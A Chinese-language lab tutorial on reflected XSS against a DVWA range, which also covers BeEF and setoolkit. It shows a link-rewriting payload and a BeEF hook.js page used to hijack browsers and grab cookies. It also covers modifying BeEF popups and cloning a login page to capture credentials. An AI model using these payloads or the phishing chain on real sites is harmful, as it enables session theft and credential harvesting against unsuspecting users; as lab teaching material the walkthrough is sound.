> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU4MjYxNTYwNA==&mid=2247487794&idx=1&sn=0cea81a72fef80ba36d063cc1c42e9da

#  新手基础学习—XSS攻击实战应用方式  
原创 【白】  白安全组   2025-06-28 08:23  
  
靶场地址可以访问www.wangehacker.cn中找到社团资源，找到对应的靶场，也可自行本地搭建。（网上搜DVWA靶场搭建会有很多）  
  
  
任务一：构建反射型XSS攻击，实现修改页面所有链接  
  
构建一个payload需要将页面的连接也就是a标签改掉，所以其中需要写一个循环语句，语句结构：  

```
<script>
window.onload = function(){
var link = document.getElementsByTagName(&#34;a&#34;);
for(j=0;j<link.length;j++){
link[j].href=&#34;http://www.baidu.com&#34;;}
}</script>
```

  
  
其中getElementsByTagName是获取页面中所有标签名为a的，也就是所有的a标签，下面一个循环语句替换所有a标签。  
  
然后我们打开靶场将语句注入进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lmqSYkonvBPx5YPZjsCrAud2sxXmSHqQbFzqNnktvicMg0O1OOibQTsyg/640?wx_fmt=png&from=appmsg "")  
  
我们从上面注入进去后，查看源码发现都被替换成百度的地址了。  
  
  
任务二：使用beef 劫持用户浏览器  
  
首先我们在kali中打开beef，然后我们设置一下密码就可以加载登录后台了，后台的用户名是beef  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7libo5g5EHJRibOaick2iaPG3e16qPPjSshguLCObM086IGwia4xic0Bf8lLHA/640?wx_fmt=png&from=appmsg "")  
  
我们登录一下，地址在这里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7ltjSk8Eu5pD01tJ4ibDRFeozQRa0tvtDSU3ErPY2Q76vicFVF06VLTxSQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lgOicw7LK6ibbOh90mcKmPZ2XNlUrjZ1yCTQz1PwGcyEjfaM0VKiaLZJ9w/640?wx_fmt=png&from=appmsg "")  
  
我们新建一个页面来加载beef的js文件，我们先启动apache  
  
systemctl start apache2  
  
然后我们新建一个html文件  
  
vim /var/www/html/hook.html  
  
然后写入  

```
<html><head>
<script src=’http://192.168.43.15:3000/hook.js’></script>
</head><body><h1>hi</h1></body></html>
```

  
  
然后我们将上面的payload改一下  

```
<script>
window.onload = function(){
var link = document.getElementsByTagName(&#34;a&#34;);
for(j=0;j<link.length;j++){
link[j].href=&#34;http://192.168.43.15/hook.html&#34;;}
}</script>
```

  
  
我们将payload插入进去后随便点开一个连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7liaxcKhJvQsKxS9kAbYBB1MILmPglK3qZYibuMgbcUCiaezZNgPoeyXM5w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lprEauOL36QticJia1cf2Yop8Nfd17vFSKWSQF1ibRUic1mQRgAmialxBWkQ/640?wx_fmt=png&from=appmsg "")  
  
然后我们打开beef就可以看到上线了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lNzsRicK3WoKXYLO9cZRcLmfOs2k7WOfQiaYbyTSricUoZZMrTKvQiaibWaw/640?wx_fmt=png&from=appmsg "")  
  
获取cookie  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7l5dXJL4AdxHMm1bWYXU1WMP2PGozAJvBGibwrTibfMvoEUQfEHUnhkxCA/640?wx_fmt=png&from=appmsg "")  
  
  
任务三：实现自定义弹窗位置和大小，并在弹窗中加入图片和超链接  
  
我们利用beef进行弹窗。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lEhKrXt1I9dKqmmr1sR3mrAlFtFRNTjCjmP28QqnC3icUibiaY9C5rZ5Hw/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到右下角的弹窗  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lkjCfCz4JSNibS9gcYjErhMxjEW6SEV0D6H2PZdEakCFY0WxqkDHsFyQ/640?wx_fmt=png&from=appmsg "")  
  
我们需要进去加上图片并且修改一下弹窗的大小和位置  
  
我们先找到路径cd /usr/share/beef-xss/modules/persistence/popunder_window  
  
然后我们到目录下查看到底有什么内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7leV9ho0OwJLHv25rrZnB8V9gicpO1kkUcXrWazROqM7cmMTEs1y6gqiaQ/640?wx_fmt=png&from=appmsg "")  
  
不出意外应该是在js中我们打开看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7ltgD2EtGJdoF1x0Mnse4jTDVfkDsibcJZ0WtiaEbvneVkqqHEqGA8wdIA/640?wx_fmt=png&from=appmsg "")  
  
宽2和高都在这里，我们修改一下大小，给一个800x800的正方形弹窗吧。  
  
再到弹窗的页面目录cd /usr/share/beef-xss/extensions/demos/html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7l4AneJ4ibNtOBF6JOWrjia27E9H5S3EIZhvKTCdenGRcXb2GfgQnpIq1w/640?wx_fmt=png&from=appmsg "")  
  
然后上传一个图片后插入进去  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lI97w3dCXRvEfreU8JsQolPMEWTOd6e9HFj6emJc5iboEEFuGHUBdpBw/640?wx_fmt=png&from=appmsg "")  
  

```
<a href=&#34;http://www.baidu.com&#34; target=&#34;_blank&#34; ><img src=&#34;1.png&#34;
width=&#34;800&#34; height=&#34;800&#34;></a>
```

  
  
我们执行一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lfIicJTY3UW1Rk8CxQPdQjSQBicjRFribmAef8B694QtoeOh12ll17AToA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lQCD9gmRj5rWsdj1GzHEd1UW177MwKuKbMTdOiccmicLMIYJYyrzKJXug/640?wx_fmt=png&from=appmsg "")  
  
右边就是我上传的图片了，已经被弹窗成功执行了  
  
  
任务四： 使用setoolkit制作钓鱼页面并获取用户的账号  
  
我们首先要去kali上面打开setoolkit，然后选择社会工程学项目，顺序大概就是1-2-3-2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lP00icxhZJKIdQqicO33y2ScHtzXibxmRMtDPWlzg0iaouLumMmam0jxBWA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lKm84I8bAS8FicbAKzRmoBJ7FhHBq0vbQOjSrRpYvD9SLAiaSuibUyDm9Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7l7xUiahY9bT7f5TmRQOrwKvOw2IWszNcIQPbCaaoTI2JPicAxHkiblzSiaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7licoqJsnhXShTs8FkwpomFeuKxWkw44Gt1FSibaVjYYQXUbHeT01zaJRw/640?wx_fmt=png&from=appmsg "")  
  
设置一个监听端口和需要克隆的网站网址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lVv6jfHsl8CBApXDMAbCrrZeFl8YqM2ISHaJSdMKZ05SexuY9aRr9sg/640?wx_fmt=png&from=appmsg "")  
  
然后我们访问一下钓鱼站点看看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lia4V0UicYDCTByyWuZbm9E46YAeg9bHMJlRBNPZGSnOWxHHZGjXGrhfw/640?wx_fmt=png&from=appmsg "")  
  
好的，一模一样，我们可以将这个连接插入到弹窗中，或者利用xss来对目标的网站插入跳转都可以。  
  
我这里选择插入到弹窗中，我们将弹窗的图片跳转连接修改一下即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7l5S0FduUNbVJOXRsyTPpX4WZcef0GNCUAygvBZv1DTJbZsBcgokpGUw/640?wx_fmt=png&from=appmsg "")  
  
然后我们弹窗  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lBLPQtvI8qH0DX1WTfX9BQTaG4via0V3iceTW6ZK7sa3AQ8UY3jeiaATiaQ/640?wx_fmt=png&from=appmsg "")  
  
我们点击图片  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7lACc8rXoG7tATvuuGP6YfNVEmEibeYzjnyWYTINnwciccZicwomB75WYtA/640?wx_fmt=png&from=appmsg "")  
  
跳转到了我们的钓鱼页面在这里输入账号密码.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUYj4GM697UWUic9licFOlMO7ltYZdBrDsqCw9mAfc8hcDHVxuQZIo7p6iaEs3DbVoLibKlicuibOyXqpWJA/640?wx_fmt=png&from=appmsg "")  
  
我们输入的账号密码就成功回显了。同时页面也会跳转到原本的登录页面  
  
  
